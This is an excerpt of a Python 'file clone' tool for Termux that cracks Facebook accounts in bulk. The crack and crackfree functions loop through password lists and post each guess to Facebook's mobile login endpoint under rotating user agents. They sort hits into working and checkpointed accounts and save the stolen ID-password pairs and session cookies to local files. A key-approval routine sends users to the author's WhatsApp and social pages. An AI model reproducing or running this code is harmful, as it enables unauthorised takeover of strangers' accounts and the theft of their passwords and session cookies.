...
time.sleep(2)
os.system(f'xdg-open https://https://youtube.com/@nabishal1311?si=3Utlq0DmFNV7eB-9)
os.system(f'xdg-open https://facebook.com/groups/665209805032852//?ref=share&mibextid=NSMWBT')
...
def back():
    login()
def contact():
    os.system('xdg-open https://facebook.com/groups/665209805032852/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=61551584385977')
logo =(f"""
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\
     _   wW  Ww oo_    \\  //       W  W       
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92mVIXH\033[1;91m-\033[1;92mBISHAL                    \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92mVIXH\033[1;91m-\033[1;92mBISHAL\033[1;91m-\033[1;92mKING\033[1;91m-\033[1;92mBRO           \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mVnv\033[1;91m-\033[1;92mBISHAL                    \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m BANGLADESH-FILE CLONE       \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOLS\033[1;91m        \033[1;91m: \033[1;92m Vnv\033[1;91m-\033[1;92mPIAD                     \033[1;91m|
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m VIXH-BISHAL TERMUX COMMUNITY 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Vixh-BISHAL/Approval.....m/blob/main/BISHAL-VAI').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801797394520?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python Bishal.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  BISHAL,  V I P,  Tools"')
def back():
	login()
...
def menu():
    ...
    print('\x1b[38;5;50║══=================')
    BISHAL = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if BISHAL in ['111']:
        login()
        dump_massal()
    elif BISHAL in ['1']:
        ...
        os.system('xdg-open https://github.com/Vixh-BISHAL')
        os.system("python nono.py")
    elif BISHAL in ['3','03']:
        result()
    elif BISHAL in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/profile.php?id=61551584385977.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python BISHAL-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[BISHAL-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBISHAL-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBISHAL-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[BISHAL-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBISHAL-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•BISHAL-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " BISHAL,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
